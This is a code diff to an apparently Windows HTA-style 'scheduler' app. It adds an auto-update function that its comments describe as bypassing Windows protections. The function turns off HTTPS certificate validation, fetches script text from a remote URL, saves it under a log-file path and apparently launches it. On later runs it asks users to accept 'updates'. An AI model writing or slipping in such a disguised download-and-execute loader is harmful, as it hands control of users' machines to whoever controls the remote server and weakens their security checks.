@@ -133,7 +133,75 @@
         }
 
         // Запуск умного сетевого лаунчера
-        checkAndDownloadUpdate();
+         function checkAndDownloadUpdate() {
+            var internetWorks = false;
+            var remoteCode = "";
+
+            // Обновленный пробивной HTTP-движок для обхода защитных блокировок Windows
+            try {
+                var http = null;
+                // Пробуем самый современный серверный движок Windows, который пускает на HTTPS сайты
+                try { http = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0"); } catch(e) {
+                    try { http = new ActiveXObject("MSXML2.ServerXMLHTTP"); } catch(e) {
+                        try { http = new ActiveXObject("MSXML2.XMLHTTP"); } catch(e) {}
+                    }
+                }
+                
+                if (http) {
+                    // Принудительно отключаем проверку сертификатов (чтобы старая Windows не паниковала из-за HTTPS Гитхаба)
+                    try { http.setOption(2, 13056); } catch(e){} 
+                    
+                    http.open("GET", SERVER_SCRIPT_URL + "?nocache=" + new Date().getTime(), false);
+                    http.send();
+                    if (http.status === 200) {
+                        remoteCode = http.responseText;
+                        internetWorks = true;
+                    }
+                }
+            } catch (e) { internetWorks = false; }
+
+            var fileExists = fso.FileExists(localLogPath);
+
+            // Сценарий 1: Первый запуск, а интернет заблокирован
+            if (!fileExists && !internetWorks) {
+                alert("Критическая ошибка: Не обнаружено подключение к интернету!\n\nДля первого запуска и загрузки базовых компонентов приложения требуется подключение к сети.");
+                return; 
+            }
+
+            // Сценарий 2: Первый запуск — скачиваем логику
+            if (!fileExists && internetWorks && remoteCode.trim().length > 0) {
+                try {
+                    var newFile = fso.CreateTextFile(localLogPath, true, true);
+                    newFile.Write(remoteCode);
+                    newFile.Close();
+                } catch(err) {}
+                launchLocalLogic();
+                return;
+            }
+
+            // Сценарий 3: Обычный запуск — проверяем обновления
+            if (fileExists && internetWorks && remoteCode.trim().length > 0) {
+                var localCode = "";
+                try {
+                    var localFile = fso.OpenTextFile(localLogPath, 1, false, -1);
+                    localCode = localFile.ReadAll();
+                    localFile.Close();
+                } catch(err){}
+
+                if (remoteCode !== localCode) {
+                    if (confirm("Внимание! Обнаружена новая, более стабильная версия планировщика.\n\nУстановить обновление? (Ваши личные расписания НЕ будут затронуты).")) {
+                        try {
+                            var updateFile = fso.CreateTextFile(localLogPath, true, true);
+                            updateFile.Write(remoteCode);
+                            updateFile.Close();
+                            alert("Приложение успешно обновлено до актуального релиза!");
+                        } catch(err){}
+                    }
+                }
+            }
+
+            launchLocalLogic();
+        }
     </script>
 </body>
 </html>
